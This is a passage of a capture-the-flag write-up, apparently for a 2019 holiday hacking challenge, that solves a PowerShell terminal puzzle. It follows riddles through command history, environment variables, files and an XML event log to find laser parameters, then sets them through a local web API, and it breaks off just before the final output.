&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS /home/elf&amp;gt; (Invoke-WebRequest -Uri http://localhost:1225/).RawContent&lt;/span&gt;
&lt;span class="go"&gt;HTTP/1.0 200 OK&lt;/span&gt;
&lt;span class="go"&gt;Server: Werkzeug/0.16.0&lt;/span&gt;
&lt;span class="go"&gt;Server: Python/3.6.9&lt;/span&gt;
&lt;span class="go"&gt;Date: Mon, 23 Dec 2019 20:01:04 GMT&lt;/span&gt;
&lt;span class="go"&gt;Content-Type: text/html; charset=utf-8&lt;/span&gt;
&lt;span class="go"&gt;Content-Length: 860&lt;/span&gt;

&lt;span class="go"&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;pre&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;----------------------------------------------------&lt;/span&gt;
&lt;span class="go"&gt;Christmas Cheer Laser Project Web API&lt;/span&gt;
&lt;span class="go"&gt;----------------------------------------------------&lt;/span&gt;
&lt;span class="go"&gt;Turn the laser on/off:&lt;/span&gt;
&lt;span class="go"&gt;GET http://localhost:1225/api/on&lt;/span&gt;
&lt;span class="go"&gt;GET http://localhost:1225/api/off&lt;/span&gt;

&lt;span class="go"&gt;Check the current Mega-Jollies of laser output&lt;/span&gt;
&lt;span class="go"&gt;GET http://localhost:1225/api/output&lt;/span&gt;

&lt;span class="go"&gt;Change the lense refraction value (1.0 - 2.0):&lt;/span&gt;
&lt;span class="go"&gt;GET http://localhost:1225/api/refraction?val=1.0&lt;/span&gt;

&lt;span class="go"&gt;Change laser temperature in degrees Celsius:&lt;/span&gt;
&lt;span class="go"&gt;GET http://localhost:1225/api/temperature?val=-10&lt;/span&gt;

&lt;span class="go"&gt;Change the mirror angle value (0 - 359):&lt;/span&gt;
&lt;span class="go"&gt;GET http://localhost:1225/api/angle?val=45.1&lt;/span&gt;

&lt;span class="go"&gt;Change gaseous elements mixture:&lt;/span&gt;
&lt;span class="go"&gt;POST http://localhost:1225/api/gas&lt;/span&gt;
&lt;span class="go"&gt;POST BODY EXAMPLE (gas mixture percentages):&lt;/span&gt;
&lt;span class="go"&gt;O=5&amp;amp;H=5&amp;amp;He=5&amp;amp;N=5&amp;amp;Ne=20&amp;amp;Ar=10&amp;amp;Xe=10&amp;amp;F=20&amp;amp;Kr=10&amp;amp;Rn=10&lt;/span&gt;
&lt;span class="go"&gt;----------------------------------------------------&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;/pre&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright, there is an API available on the research lab computer, where we can
change the value of the different parameters of the laser. So, once we find the
correct values for the laser's parameters, we'll input them here.&lt;/p&gt;
&lt;p&gt;Now, let's take a look at this calling card file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS /home/elf&amp;gt; Get-Content /home/callingcard.txt&lt;/span&gt;
&lt;span class="go"&gt;What&amp;#39;s become of your dear laser?&lt;/span&gt;
&lt;span class="go"&gt;Fa la la la la, la la la la&lt;/span&gt;
&lt;span class="go"&gt;Seems you can&amp;#39;t now seem to raise her!&lt;/span&gt;
&lt;span class="go"&gt;Fa la la la la, la la la la&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;Could commands hold riddles in hist&amp;#39;ry?&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;Fa la la la la, la la la la&lt;/span&gt;
&lt;span class="go"&gt;Nay! You&amp;#39;ll ever suffer myst&amp;#39;ry!&lt;/span&gt;
&lt;span class="go"&gt;Fa la la la la, la la la la&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The calling card seems to imply that we can find some riddles in the command
history. So let's dig into it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS /home/elf&amp;gt; get-history&lt;/span&gt;

&lt;span class="go"&gt;  Id CommandLine&lt;/span&gt;
&lt;span class="go"&gt;  -- -----------&lt;/span&gt;
&lt;span class="go"&gt;   1 Get-Help -Name Get-Process&lt;/span&gt;
&lt;span class="go"&gt;   2 Get-Help -Name Get-*&lt;/span&gt;
&lt;span class="go"&gt;   3 Set-ExecutionPolicy Unrestricted&lt;/span&gt;
&lt;span class="go"&gt;   4 Get-Service | ConvertTo-HTML -Property Name, Status &amp;gt; C:\services.htm&lt;/span&gt;
&lt;span class="go"&gt;   5 Get-Service | Export-CSV c:\service.csv&lt;/span&gt;
&lt;span class="go"&gt;   6 Get-Service | Select-Object Name, Status | Export-CSV c:\service.csv&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;   7 (Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;   8 Get-EventLog -Log &amp;quot;Application&amp;quot;&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;   9 I have many name=value variables that I share to applications system wide. At a com…&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We've found the correct value for the angle, which seems to be &lt;code&gt;65.5&lt;/code&gt;.
The ninth entry also seems interesting, let's take a look at it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS /home/elf&amp;gt; get-history -id 9  | format-list&lt;/span&gt;

&lt;span class="go"&gt;Id                 : 9&lt;/span&gt;
&lt;span class="go"&gt;CommandLine        : I have many name=value variables that I share to applications&lt;/span&gt;
&lt;span class="go"&gt;                     system wide. At a command I will reveal my secrets once you Get my&lt;/span&gt;
&lt;span class="go"&gt;                     Child Items.&lt;/span&gt;
&lt;span class="go"&gt;ExecutionStatus    : Completed&lt;/span&gt;
&lt;span class="go"&gt;StartExecutionTime : 11/29/19 4:57:16 PM&lt;/span&gt;
&lt;span class="go"&gt;EndExecutionTime   : 11/29/19 4:57:16 PM&lt;/span&gt;
&lt;span class="go"&gt;Duration           : 00:00:00.6090308&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Sharing &lt;code&gt;name=value&lt;/code&gt; variables system wide... This seems to point to
&lt;a class="reference external" href="https://en.wikipedia.org/wiki/Environment_variable"&gt;environment variables&lt;/a&gt;.
Let's explore the environment variables, using the &lt;code&gt;env:&lt;/code&gt; object:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS /home/elf&amp;gt; Get-ChildItem env:&lt;/span&gt;

&lt;span class="go"&gt;Name                           Value&lt;/span&gt;
&lt;span class="go"&gt;----                           -----&lt;/span&gt;
&lt;span class="go"&gt;_                              /bin/su&lt;/span&gt;
&lt;span class="go"&gt;DOTNET_SYSTEM_GLOBALIZATION_I… false&lt;/span&gt;
&lt;span class="go"&gt;HOME                           /home/elf&lt;/span&gt;
&lt;span class="go"&gt;HOSTNAME                       ed982fcad65c&lt;/span&gt;
&lt;span class="go"&gt;LANG                           en_US.UTF-8&lt;/span&gt;
&lt;span class="go"&gt;LC_ALL                         en_US.UTF-8&lt;/span&gt;
&lt;span class="go"&gt;LOGNAME                        elf&lt;/span&gt;
&lt;span class="go"&gt;MAIL                           /var/mail/elf&lt;/span&gt;
&lt;span class="go"&gt;PATH                           /opt/microsoft/powershell/6:/usr/local/sbin:/usr/local/bi…&lt;/span&gt;
&lt;span class="go"&gt;PSModuleAnalysisCachePath      /var/cache/microsoft/powershell/PSModuleAnalysisCache/Mod…&lt;/span&gt;
&lt;span class="go"&gt;PSModulePath                   /home/elf/.local/share/powershell/Modules:/usr/local/shar…&lt;/span&gt;
&lt;span class="go"&gt;PWD                            /home/elf&lt;/span&gt;
&lt;span class="go"&gt;RESOURCE_ID                    f8a577fa-4565-46c9-a2b6-5ab85e9da0e1&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;riddle                         Squeezed and compressed I am hidden away. Expand me from …&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;SHELL                          /home/elf/elf&lt;/span&gt;
&lt;span class="go"&gt;SHLVL                          1&lt;/span&gt;
&lt;span class="go"&gt;TERM                           xterm&lt;/span&gt;
&lt;span class="go"&gt;USER                           elf&lt;/span&gt;
&lt;span class="go"&gt;USERDOMAIN                     laserterminal&lt;/span&gt;
&lt;span class="go"&gt;userdomain                     laserterminal&lt;/span&gt;
&lt;span class="go"&gt;username                       elf&lt;/span&gt;
&lt;span class="go"&gt;USERNAME                       elf&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;code&gt;riddle&lt;/code&gt; variable seems interesting. Let's expand it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS /home/elf&amp;gt; Get-ChildItem env:riddle | Format-List&lt;/span&gt;

&lt;span class="go"&gt;Name  : riddle&lt;/span&gt;
&lt;span class="go"&gt;Value : Squeezed and compressed I am hidden away. Expand me from my prison and I will&lt;/span&gt;
&lt;span class="go"&gt;        show you the way. Recurse through all /etc and Sort on my LastWriteTime to&lt;/span&gt;
&lt;span class="go"&gt;        reveal im the newest of all.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright, let's list every file in &lt;code&gt;/etc&lt;/code&gt; and sort by their
&lt;code&gt;LastWriteTime&lt;/code&gt; attribute:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS /home/elf&amp;gt; Get-ChildItem -recurse /etc | sort LastWriteTime&lt;/span&gt;
&lt;span class="go"&gt;[...]&lt;/span&gt;
&lt;span class="go"&gt;    Directory: /etc/apt&lt;/span&gt;

&lt;span class="go"&gt;Mode                LastWriteTime         Length Name&lt;/span&gt;
&lt;span class="go"&gt;----                -------------         ------ ----&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;--r---          12/23/19  8:35 PM        5662902 archive&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The newest file seems to be an archive. Let's extract it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS /home/elf&amp;gt; Expand-Archive -Path /etc/apt/archive -DestinationPath extracted_archive&lt;/span&gt;
&lt;span class="go"&gt;PS /home/elf&amp;gt; dir&lt;/span&gt;
&lt;span class="go"&gt;Directory: /home/elf&lt;/span&gt;

&lt;span class="go"&gt;Mode                LastWriteTime         Length Name&lt;/span&gt;
&lt;span class="go"&gt;----                -------------         ------ ----&lt;/span&gt;
&lt;span class="go"&gt;d-r---          12/13/19  5:15 PM                depths&lt;/span&gt;
&lt;span class="go"&gt;d-----          12/23/19  8:37 PM                extracted_archive&lt;/span&gt;
&lt;span class="go"&gt;--r---          12/13/19  4:29 PM           2029 motd&lt;/span&gt;
&lt;span class="go"&gt;PS /home/elf&amp;gt; cd ./extracted_archive/refraction&lt;/span&gt;
&lt;span class="go"&gt;PS /home/elf/extracted_archive/refraction&amp;gt; dir&lt;/span&gt;


&lt;span class="go"&gt;    Directory: /home/elf/extracted_archive/refraction&lt;/span&gt;

&lt;span class="go"&gt;Mode                LastWriteTime         Length Name&lt;/span&gt;
&lt;span class="go"&gt;----                -------------         ------ ----&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;------           11/7/19 11:57 AM            134 riddle&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="go"&gt;------           11/5/19  2:26 PM        5724384 runme.elf&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The archive contains an ELF binary, and a riddle. First, let's run the ELF
binary. I didn't manage to run it from the box, so I extracted it, by base64
encoding it, and then decoding it on a Linux box. I was then able to run it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;user@debian:~$&lt;/span&gt; ./powershell_elf.bin
&lt;span class="hll"&gt;&lt;span class="go"&gt;refraction?val=1.867&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This gives us the correct value for the refraction variable. Now, let's look
at the &lt;code&gt;riddle&lt;/code&gt; file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS /home/elf/extracted_archive/refraction&amp;gt; Get-Content ./riddle&lt;/span&gt;
&lt;span class="go"&gt;Very shallow am I in the depths of your elf home. You can find my entity by using my md5 identity:&lt;/span&gt;

&lt;span class="go"&gt;25520151A320B5B0D21561F92C8F6224&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, we must look for a file in the &lt;code&gt;/home/elf/depths&lt;/code&gt; folder, with an
MD5 sum equal to &lt;code&gt;25520151A320B5B0D21561F92C8F6224&lt;/code&gt;. Let's take a look:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS /home/elf&amp;gt; Get-ChildItem -file -recurse ./depths/ | get-filehash -algorithm MD5 | where-object { $_.HASH -eq &amp;quot;25520151A320B5B0D21561F92C8F6224&amp;quot; } | Format-List&lt;/span&gt;

&lt;span class="go"&gt;Algorithm : MD5&lt;/span&gt;
&lt;span class="go"&gt;Hash      : 25520151A320B5B0D21561F92C8F6224&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;Path      : /home/elf/depths/produce/thhy5hll.txt&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The file with an MD5 sum of &lt;code&gt;25520151A320B5B0D21561F92C8F6224&lt;/code&gt; seems to
be &lt;code&gt;/home/elf/depths/produce/thhy5hll.txt&lt;/code&gt;. Let's look inside:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS /home/elf&amp;gt; Get-Content /home/elf/depths/produce/thhy5hll.txt&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;temperature?val=-33.5&lt;/span&gt;
&lt;/span&gt;
&lt;span class="go"&gt;I am one of many thousand similar txt&amp;#39;s contained within the deepest of /home/elf/depths. Finding me will give you the most strength but doing so will require Piping all the FullName&amp;#39;s to Sort Length.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We now have the correct value for the temperature, &lt;code&gt;-33.5&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Apparently, the new file to find is the one with the longest full name in
&lt;code&gt;/home/elf/depths&lt;/code&gt;. Let's list the file and sort them by their
&lt;code&gt;FullName&lt;/code&gt; attribute:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS /home/elf/&amp;gt; Get-ChildItem -file -recurse /home/elf/depths | sort {  $_.FullName.length } | select-object -property FullName | fl&lt;/span&gt;
&lt;span class="go"&gt;[...]&lt;/span&gt;
&lt;span class="go"&gt;FullName : /home/elf/depths/larger/cloud/behavior/beauty/enemy/produce/age/chair/unknown/&lt;/span&gt;
&lt;span class="go"&gt;           escape/vote/long/writer/behind/ahead/thin/occasionally/explore/tape/wherever/p&lt;/span&gt;
&lt;span class="go"&gt;           ractical/therefore/cool/plate/ice/play/truth/potatoes/beauty/fourth/careful/da&lt;/span&gt;
&lt;span class="go"&gt;           wn/adult/either/burn/end/accurate/rubbed/cake/main/she/threw/eager/trip/to/soo&lt;/span&gt;
&lt;span class="go"&gt;           n/think/fall/is/greatest/become/accident/labor/sail/dropped/fox/0jhj5xz6.txt&lt;/span&gt;
&lt;span class="go"&gt;PS /home/elf/extracted_archive/refraction&amp;gt; gc /home/elf/depths/larger/cloud/behavior/beauty/enemy/produce/age/chair/unknown/escape/vote/long/writer/behind/ahead/thin/occasionally/explore/tape/wherever/practical/therefore/cool/plate/ice/play/truth/potatoes/beauty/fourth/careful/dawn/adult/either/burn/end/accurate/rubbed/cake/main/she/threw/eager/trip/to/soon/think/fall/is/greatest/become/accident/labor/sail/dropped/fox/0jhj5xz6.txt&lt;/span&gt;
&lt;span class="go"&gt;Get process information to include Username identification. Stop Process to show me you&amp;#39;re skilled and in this order they must be killed:&lt;/span&gt;

&lt;span class="go"&gt;bushy&lt;/span&gt;
&lt;span class="go"&gt;alabaster&lt;/span&gt;
&lt;span class="go"&gt;minty&lt;/span&gt;
&lt;span class="go"&gt;holly&lt;/span&gt;

&lt;span class="go"&gt;Do this for me and then you /shall/see .&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Once we find the file with the longest name, we're tasked with a new challenge.
We must kill the processes of the given users, in this particular order. Let's
list the processes and kill them:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS /home/elf&amp;gt; Get-Process -IncludeUserName&lt;/span&gt;

&lt;span class="go"&gt;     WS(M)   CPU(s)      Id UserName                       ProcessName&lt;/span&gt;
&lt;span class="go"&gt;     -----   ------      -- --------                       -----------&lt;/span&gt;
&lt;span class="go"&gt;     26.84     1.86       7 root                           CheerLaserServi&lt;/span&gt;
&lt;span class="go"&gt;    184.41    61.33      32 elf                            elf&lt;/span&gt;
&lt;span class="go"&gt;      3.56     0.04       1 root                           init&lt;/span&gt;
&lt;span class="go"&gt;      0.82     0.00      24 bushy                          sleep&lt;/span&gt;
&lt;span class="go"&gt;      0.82     0.00      26 alabaster                      sleep&lt;/span&gt;
&lt;span class="go"&gt;      0.75     0.00      29 minty                          sleep&lt;/span&gt;
&lt;span class="go"&gt;      0.82     0.00      30 holly                          sleep&lt;/span&gt;
&lt;span class="go"&gt;      3.32     0.00      31 root                           su&lt;/span&gt;

&lt;span class="go"&gt;PS /home/elf/extracted_archive/refraction&amp;gt; Stop-Process -Id 24&lt;/span&gt;
&lt;span class="go"&gt;PS /home/elf/extracted_archive/refraction&amp;gt; Stop-Process -Id 26&lt;/span&gt;
&lt;span class="go"&gt;PS /home/elf/extracted_archive/refraction&amp;gt; Stop-Process -Id 29&lt;/span&gt;
&lt;span class="go"&gt;PS /home/elf/extracted_archive/refraction&amp;gt; Stop-Process -Id 30&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;After killing the processes, the riddle said that we &lt;code&gt;/shall/see&lt;/code&gt;. Let's
look into the &lt;code&gt;/shall&lt;/code&gt; folder at the root of the file system:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS /home/elf/extracted_archive/refraction&amp;gt; dir /shall&lt;/span&gt;


&lt;span class="go"&gt;    Directory: /shall&lt;/span&gt;

&lt;span class="go"&gt;Mode                LastWriteTime         Length Name&lt;/span&gt;
&lt;span class="go"&gt;----                -------------         ------ ----&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;--r---          12/23/19  8:55 PM            149 see&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;There is indeed a &lt;code&gt;/shall/see&lt;/code&gt; file. Let's get its content:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS /home/elf&amp;gt; Get-Content /shall/see&lt;/span&gt;
&lt;span class="go"&gt;Get the .xml children of /etc - an event log to be found. Group all .Id&amp;#39;s and the last thing will be in the Properties of the lonely unique event Id.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, there is an event log in XML format in &lt;code&gt;/etc&lt;/code&gt;. We must find the event
with the unique &lt;code&gt;Id&lt;/code&gt;, and the last parameters for the alser will be in
its properties. First, let's find this XML file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS /home/elf/extracted_archive/refraction&amp;gt; Get-ChildItem -recurse -file -include &amp;quot;*.xml&amp;quot; /etc&lt;/span&gt;
&lt;span class="go"&gt;Get-ChildItem : Access to the path &amp;#39;/etc/ssl/private&amp;#39; is denied.&lt;/span&gt;
&lt;span class="go"&gt;At line:1 char:1&lt;/span&gt;
&lt;span class="go"&gt;+ Get-ChildItem -recurse -file -include &amp;quot;*.xml&amp;quot; /etc&lt;/span&gt;
&lt;span class="go"&gt;+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&lt;/span&gt;
&lt;span class="go"&gt;+ CategoryInfo          : PermissionDenied: (/etc/ssl/private:String) [Get-ChildItem], UnauthorizedAccessException&lt;/span&gt;
&lt;span class="go"&gt;+ FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand&lt;/span&gt;



&lt;span class="hll"&gt;&lt;span class="go"&gt;    Directory: /etc/systemd/system/timers.target.wants&lt;/span&gt;
&lt;/span&gt;
&lt;span class="go"&gt;Mode                LastWriteTime         Length Name&lt;/span&gt;
&lt;span class="go"&gt;----                -------------         ------ ----&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;--r---          11/18/19  7:53 PM       10006962 EventLog.xml&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, the event log sits at &lt;code&gt;/etc/systemd/system/timers.target.wants/EventLog.xml&lt;/code&gt;.
We can directly parse the content of the file in PowerShell:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS /home/elf&amp;gt; [xml]$event_log = gc /etc/systemd/system/timers.target.wants/EventLog.xml&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Then, let's take a look at every &lt;code&gt;Id&lt;/code&gt; to see which one is unique:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS /home/elf&amp;gt; $event_log.Objs.Obj.Props.I32 | ? { $_.N -eq &amp;quot;Id&amp;quot; } | % {$_.&amp;#39;#text&amp;#39;} | Group-Object | Format-Table count, name&lt;/span&gt;

&lt;span class="go"&gt;Count Name&lt;/span&gt;
&lt;span class="go"&gt;----- ----&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;    1 1&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;   39 2&lt;/span&gt;
&lt;span class="go"&gt;  179 3&lt;/span&gt;
&lt;span class="go"&gt;    2 4&lt;/span&gt;
&lt;span class="go"&gt;  905 5&lt;/span&gt;
&lt;span class="go"&gt;   98 6&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, the unique &lt;code&gt;Id&lt;/code&gt; seems to be &lt;code&gt;1&lt;/code&gt;. Let's list the properties of
the event with &lt;code&gt;Id=1&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS /home/elf&amp;gt; $event_log.Objs.Obj | ? { $_.Props.I32.N -eq &amp;#39;Id&amp;#39; -and $_.Props.I32.&amp;#39;#text&amp;#39; -eq 1} | % { $_.Props.Obj.LST.Obj.Props.S.&amp;#39;#text&amp;#39; }&lt;/span&gt;
&lt;span class="go"&gt;2019-11-07 17:59:56.525&lt;/span&gt;
&lt;span class="go"&gt;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&lt;/span&gt;
&lt;span class="go"&gt;10.0.14393.206 (rs1_release.160915-0644)&lt;/span&gt;
&lt;span class="go"&gt;Windows PowerShell&lt;/span&gt;
&lt;span class="go"&gt;Microsoft® Windows® Operating System&lt;/span&gt;
&lt;span class="go"&gt;Microsoft Corporation&lt;/span&gt;
&lt;span class="go"&gt;PowerShell.EXE&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c &amp;quot;`$correct_gases_postbody = @{`n    O=6`n    H=7`n    He=3`n    N=4`n    Ne=22`n    Ar=11`n    Xe=10`n    F=20`n    Kr=8`n    Rn=9`n}`n&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;C:\&lt;/span&gt;
&lt;span class="go"&gt;ELFURESEARCH\allservices&lt;/span&gt;
&lt;span class="go"&gt;High&lt;/span&gt;
&lt;span class="go"&gt;MD5=097CE5761C89434367598B34FE32893B&lt;/span&gt;
&lt;span class="go"&gt;C:\Windows\System32\svchost.exe&lt;/span&gt;
&lt;span class="go"&gt;C:\Windows\system32\svchost.exe -k netsvcs&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This gives us the values for the gas dosage for the laser. We now have every
parameters to repair the laser.&lt;/p&gt;
&lt;p&gt;First let's update the angle:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS /home/elf&amp;gt; (Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent&lt;/span&gt;
&lt;span class="go"&gt;HTTP/1.0 200 OK&lt;/span&gt;
&lt;span class="go"&gt;Server: Werkzeug/0.16.0&lt;/span&gt;
&lt;span class="go"&gt;Server: Python/3.6.9&lt;/span&gt;
&lt;span class="go"&gt;Date: Tue, 24 Dec 2019 11:42:25 GMT&lt;/span&gt;
&lt;span class="go"&gt;Content-Type: text/html; charset=utf-8&lt;/span&gt;
&lt;span class="go"&gt;Content-Length: 77&lt;/span&gt;

&lt;span class="go"&gt;Updated Mirror Angle - Check /api/output if 5 Mega-Jollies per liter reached.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now the refraction:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS /home/elf&amp;gt; (Invoke-WebRequest http://127.0.0.1:1225/api/refraction?val=1.867).RawContent&lt;/span&gt;
&lt;span class="go"&gt;HTTP/1.0 200 OK&lt;/span&gt;
&lt;span class="go"&gt;Server: Werkzeug/0.16.0&lt;/span&gt;
&lt;span class="go"&gt;Server: Python/3.6.9&lt;/span&gt;
&lt;span class="go"&gt;Date: Tue, 24 Dec 2019 11:42:30 GMT&lt;/span&gt;
&lt;span class="go"&gt;Content-Type: text/html; charset=utf-8&lt;/span&gt;
&lt;span class="go"&gt;Content-Length: 87&lt;/span&gt;

&lt;span class="go"&gt;Updated Lense Refraction Level - Check /api/output if 5 Mega-Jollies per liter reached.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Then the temperature:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS /home/elf&amp;gt; (Invoke-WebRequest http://127.0.0.1:1225/api/temperature?val=-33.5).RawContent&lt;/span&gt;
&lt;span class="go"&gt;HTTP/1.0 200 OK&lt;/span&gt;
&lt;span class="go"&gt;Server: Werkzeug/0.16.0&lt;/span&gt;
&lt;span class="go"&gt;Server: Python/3.6.9&lt;/span&gt;
&lt;span class="go"&gt;Date: Tue, 24 Dec 2019 11:42:34 GMT&lt;/span&gt;
&lt;span class="go"&gt;Content-Type: text/html; charset=utf-8&lt;/span&gt;
&lt;span class="go"&gt;Content-Length: 82&lt;/span&gt;

&lt;span class="go"&gt;Updated Laser Temperature - Check /api/output if 5 Mega-Jollies per liter reached.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And finally the gas levels:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS /home/elf&amp;gt; $correct_gases_postbody = @{ O=6; H=7; He=3; N=4; Ne=22; Ar=11; Xe=10; F=20; Kr=8; Rn=9}&lt;/span&gt;
&lt;span class="go"&gt;PS /home/elf&amp;gt; (Invoke-WebRequest -Uri http://127.0.0.1:1225/api/gas -Method POST -Body $correct_gases_postbody).RawContent&lt;/span&gt;
&lt;span class="go"&gt;HTTP/1.0 200 OK&lt;/span&gt;
&lt;span class="go"&gt;Server: Werkzeug/0.16.0&lt;/span&gt;
&lt;span class="go"&gt;Server: Python/3.6.9&lt;/span&gt;
&lt;span class="go"&gt;Date: Tue, 24 Dec 2019 11:42:45 GMT&lt;/span&gt;
&lt;span class="go"&gt;Content-Type: text/html; charset=utf-8&lt;/span&gt;
&lt;span class="go"&gt;Content-Length: 81&lt;/span&gt;

&lt;span class="go"&gt;Updated Gas Measurements - Check /api/output if 5 Mega-Jollies per liter reached.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Aaaaand:&lt;/p&gt;
